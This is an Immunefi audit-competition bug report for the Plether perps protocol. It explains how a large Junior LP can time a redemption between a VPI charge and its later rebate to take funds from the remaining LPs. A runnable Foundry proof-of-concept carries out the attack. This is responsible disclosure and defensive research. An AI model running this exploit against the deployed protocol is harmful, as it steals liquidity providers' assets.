# \#97667 [SC-Critical] Junior LP redemption settled between a VPI charge and its rebate is priced on a temporary NAV lift, letting a redeeming LP take funds from remaining LPs

**Submitted on Nov 2nd 2026 at 15:56:52 UTC by @Rooster68268 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97667
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
Positive VPI paid on an open is booked at once as LP revenue and raises Junior NAV. The matching rebate leaves the pool only when the position closes, and nothing in NAV reflects that pending rebate. So a redemption settled between the two is priced on a temporary NAV lift, and the LPs who stay fund the rebate afterwards. An LP with a large Junior share can create this on purpose within one epoch, taking part of the remaining LPs' assets.

## Vulnerability Details
**Charge reaches NAV immediately.** `executeOpen` calls `recordClaimantInflow(Revenue, CashArrived)`, so the charge raises physical assets and then Junior principal at the next settlement: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L458

**Rebate leaves later.** `executeClose` pays the rebate from pool cash, after the redemption was priced and funded: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L622

**The clamp doesn't stop it.** The lifetime clamp allows a rebate up to the charge already paid, so lifetime VPI never goes negative: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L117

`settleLpEpoch` is permissionless and the LP controls when the position opens and closes, so the LP can place the redemption's pricing inside this gap every time.

**Why this is not already covered:**
- The AI scan's INFO findings on VPI ("Temporary pool liquidity can reduce a skew-increasing close charge" and "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate") concern changing the depth denominator. Here the rebate stays capped at the charge paid; the defect is when each side reaches NAV relative to a redemption.
- `SECURITY.md` says the clamp "intentionally zeroes otherwise extractable rebate-only round trips". This round trip is not rebate-only and keeps lifetime VPI at or above zero.
- `ACCOUNTING_SPEC.md` says the VPI reserve "does not inflate marked LP receivables or symmetric LP NAV". That covers negative VPI inflating NAV. This is the opposite direction: realized positive VPI that is due back but is not offset in NAV.

## Impact Details
Direct theft of user funds, in motion. In the test below, against a control run that does nothing, the remaining Junior LP's assets fall from 1,999,890 to 1,992,856 USDG, about 0.35% in one cycle, and the attacker keeps +4,477 USDG net of execution fees. The loss is to LP assets rather than to a yield stream: the VPI charge is rebated and leaves no lasting revenue.

| Attacker share of Junior | Notional | Attacker gain | Remaining Junior LP |
|---|---|---|---|
| 2M of 4M | 4.8M | +958 USDG | -2,877 USDG |
| 6M of 8M | 6.4M | +4,477 USDG | -7,034 USDG |
| 14M of 16M | 9.6M | +9,117 USDG | -12,951 USDG |

The amount is bounded per cycle by the VPI charge, and scales with the position size and with the share of Junior held by other LPs. The attack is profitable and needs no privileged role.

**Limits:**
- The tests use a constant price. The attacker carries a directional position over the window, about 35 seconds in the test. That risk is roughly zero in expectation but real.
- It needs a large Junior share and millions of dollars of capital.
- Repeating it over several cycles was not tested.

## Suggested fix
Treat outstanding rebatable positive VPI as a liability when pricing LP redemptions, or recognize it as LP revenue only when it can no longer be rebated.

## References
- `HousePool.settleLpEpoch`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- Whitepaper, section 5.1 and "Positive VPI increases physical pool assets": `output/pdf/plether-perps-bounded-credit-whitepaper.pdf`

## AI assistance
This report and its test were prepared with AI assistance. The test was run locally, and the figures above come from its output.


## Proof of Concept

## Proof of Concept

Runnable Foundry test on the real Router, Engine, Pool and vaults, using the risk parameters from `script/DeployPerpsArbitrumSepolia.s.sol`. Only Pyth and USDG are mocked. No fork, no privileged calls. Each result compares an attack run with a control run from the same snapshot.

### Steps
1. Hold Junior shares past the one-hour cooldown and call `requestRedeem`.
2. Shortly before that epoch's start, open a skew-increasing position from a second account, using a normal commit and execution.
3. At the epoch start, call `settleLpEpoch`, then `claimRedeem`.
4. Close the position and receive the rebate.

### Run
Save the file below as `packages/perps/test/ZZ_lp/ZZ_lp_VpiNavSandwich.t.sol`, then from `packages/perps`:

```
forge test --match-path 'test/ZZ_lp/*' -vv
```

### Result: ledger for the 6M case, in USDG

| Step | Trader | Junior NAV | Pool cash |
|---|---|---|---|
| Before open | 200,000 | 8,000,781 | 16,002,000 |
| After open: VPI 12,799 to pool, fee 2,560 to treasury | 184,641 | 8,013,579 | 16,014,798 |
| After claim: attacker receives 6,009,488 (control 5,999,890) | 184,641 | 2,004,091 | 10,005,310 |
| After close: rebate 12,798, less fee 2,560 retained by pool | 194,879 | 1,993,852 | 9,995,072 |

Against the control run: attacker +4,477, remaining Junior LP -7,034, treasury +2,560, Senior about 0. These sum to about zero, so the attacker's gain comes out of the remaining LP's assets.

### Result: effect of real oracle confidence
The test's mock uses confidence 0. I reran it with the side-adverse confidence shift at the default multiplier of 2000 bps, up to the 10 bps limit (`basketMaxConfidenceRatioBps`), by passing a nonzero confidence to `setAllUniquePrices` and removing the order's limit price:

| Confidence (bps) | 6M case: attacker / LP | 14M case: attacker / LP |
|---|---|---|
| 0 | +4,477 / -7,034 | +9,117 / -12,951 |
| 1 | +4,316 / -6,873 | +8,900 / -12,734 |
| 5 | +3,675 / -6,232 | +8,033 / -11,867 |
| 10 | +2,873 / -5,430 | +6,950 / -10,784 |

### Test

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @notice LP review, candidate V1. A reversible VPI charge raises Junior redemption NAV for exactly one settlement,
///         and the matching VPI rebate on the unwind is paid by the LPs who stayed. Real Router/Engine/Pool path,
///         release risk parameters. The attacker owns a large share of Junior so the self-funded part of the lift is
///         cheap; the net gain is the share taken from the remaining LPs. Each test compares an attack run against a
///         control run that does nothing.
contract ZZ_lp_VpiNavSandwichTest is BasePerpTest {

    address internal constant VICTIM_JUNIOR = address(0xA1);
    address internal constant SENIOR_LP = address(0xA2);
    address internal constant ATTACKER = address(0xA3);
    address internal constant ATTACKER_TRADER = address(0xA4);

    uint256 internal constant VICTIM_JUNIOR_ASSETS = 2_000_000e6;
    uint256 internal constant SENIOR_ASSETS = 8_000_000e6;
    uint256 internal constant TRADER_FUNDING = 200_000e6;

    struct Result {
        uint256 attackerWealthAfter;
        uint256 attackerRedeemed;
        uint256 victimAssetsAfter;
        uint256 seniorAssetsAfter;
        uint256 juniorNavAtRequest;
        uint256 juniorNavAtSettle;
    }

    /// @dev Identical to _riskParams() in script/DeployPerpsArbitrumSepolia.s.sol (vpiFactor 0.01e18, skew cap 0.4e18).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        vm.warp(SETUP_TIMESTAMP);
        _fundJunior(VICTIM_JUNIOR, VICTIM_JUNIOR_ASSETS);
        _fundSenior(SENIOR_LP, SENIOR_ASSETS);
    }

    function _refreshMark() internal {
        vm.prank(ATTACKER);
        router.updateMarkPrice(_mockPythUpdateData());
    }

    function _run(
        uint256 attackerDeposit,
        uint256 notionalTokens,
        bool manipulate
    ) internal returns (Result memory r) {
        settlementToken.mint(ATTACKER_TRADER, TRADER_FUNDING);
        vm.startPrank(ATTACKER_TRADER);
        settlementToken.approve(address(clearinghouse), TRADER_FUNDING);
        clearinghouse.deposit(ATTACKER_TRADER, TRADER_FUNDING);
        vm.stopPrank();

        uint256 attackerShares = _fundJuniorDelayed(ATTACKER, attackerDeposit);

        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark();
        r.juniorNavAtRequest = juniorVault.totalAssets();
        vm.prank(ATTACKER);
        uint256 requestId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);

        // Just before the matured epoch is settled, open a skew-increasing position. Its positive VPI is booked as LP
        // revenue, lifting Junior NAV for this one settlement snapshot.
        vm.warp(pool.lpEpochStart(requestId) - 30);
        if (manipulate) {
            vm.prank(ATTACKER_TRADER);
            router.commitOrder(CfdTypes.Side.LONG, notionalTokens, 100_000e6, 1e8, false);
            vm.prank(ATTACKER);
            router.executeOrder(router.nextExecuteId(), _mockPythUpdateData());
            (uint256 size,,,,,,) = engine.positions(ATTACKER_TRADER);
            assertEq(size, notionalTokens, "open must execute");
        }

        vm.warp(pool.lpEpochStart(requestId));
        r.juniorNavAtSettle = juniorVault.totalAssets();
        vm.prank(ATTACKER);
        router.settleLpEpoch(_mockPythUpdateData());

        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, ATTACKER);
        assertEq(claimable, attackerShares, "attacker redemption must be fully funded");
        vm.prank(ATTACKER);
        r.attackerRedeemed = juniorVault.claimRedeem(requestId, claimable, ATTACKER, ATTACKER);

        // Unwind the position. Its VPI rebate (bounded by the lifetime clamp at the paid charge) is paid from pool
        // cash, i.e. from the LPs who remain.
        if (manipulate) {
            vm.warp(block.timestamp + 5);
            vm.prank(ATTACKER_TRADER);
            router.commitOrder(CfdTypes.Side.LONG, notionalTokens, 0, 0, true);
            vm.prank(ATTACKER);
            router.executeOrder(router.nextExecuteId(), _mockPythUpdateData());
            (uint256 sizeAfter,,,,,,) = engine.positions(ATTACKER_TRADER);
            assertEq(sizeAfter, 0, "close must execute");
        }

        r.attackerWealthAfter = settlementToken.balanceOf(ATTACKER) + settlementToken.balanceOf(ATTACKER_TRADER)
            + clearinghouse.balanceAssets(ATTACKER) + clearinghouse.balanceAssets(ATTACKER_TRADER);
        r.victimAssetsAfter = juniorVault.estimateRedeemAssets(juniorVault.balanceOf(VICTIM_JUNIOR));
        r.seniorAssetsAfter = seniorVault.estimateRedeemAssets(seniorVault.balanceOf(SENIOR_LP));
    }

    function _compare(
        string memory label,
        uint256 attackerDeposit,
        uint256 notionalTokens
    ) internal {
        uint256 id = vm.snapshotState();
        Result memory control = _run(attackerDeposit, notionalTokens, false);
        vm.revertToState(id);
        Result memory attack = _run(attackerDeposit, notionalTokens, true);

        console2.log("=== scenario", label);
        console2.log("attacker Junior deposit (USDG)", attackerDeposit / 1e6);
        console2.log("attacker notional (tokens at $1)", notionalTokens / 1e18);
        console2.log("Junior NAV at request, attack run", attack.juniorNavAtRequest);
        console2.log("Junior NAV at settlement, attack run", attack.juniorNavAtSettle);
        console2.log("redeemed, control", control.attackerRedeemed);
        console2.log("redeemed, attack ", attack.attackerRedeemed);
        console2.log("attacker wealth, control", control.attackerWealthAfter);
        console2.log("attacker wealth, attack ", attack.attackerWealthAfter);
        console2.log("attacker net gain vs control (USDG atoms):");
        console2.logInt(int256(attack.attackerWealthAfter) - int256(control.attackerWealthAfter));
        console2.log("staying Junior LP assets, control", control.victimAssetsAfter);
        console2.log("staying Junior LP assets, attack ", attack.victimAssetsAfter);
        console2.log("staying Junior LP change vs control (USDG atoms):");
        console2.logInt(int256(attack.victimAssetsAfter) - int256(control.victimAssetsAfter));
        console2.log("senior assets, control", control.seniorAssetsAfter);
        console2.log("senior assets, attack ", attack.seniorAssetsAfter);

        assertGt(attack.attackerWealthAfter, control.attackerWealthAfter, "sandwich must beat doing nothing");
        assertLt(attack.victimAssetsAfter, control.victimAssetsAfter, "staying Junior LP must fund the gain");
    }

    function test_V1_y50pct() public {
        _compare("attacker owns ~50% of Junior", 2_000_000e6, 4_800_000e18);
    }

    function test_V1_y75pct() public {
        _compare("attacker owns ~75% of Junior", 6_000_000e6, 6_400_000e18);
    }

    function test_V1_y87pct() public {
        _compare("attacker owns ~87% of Junior", 14_000_000e6, 9_600_000e18);
    }

}
```

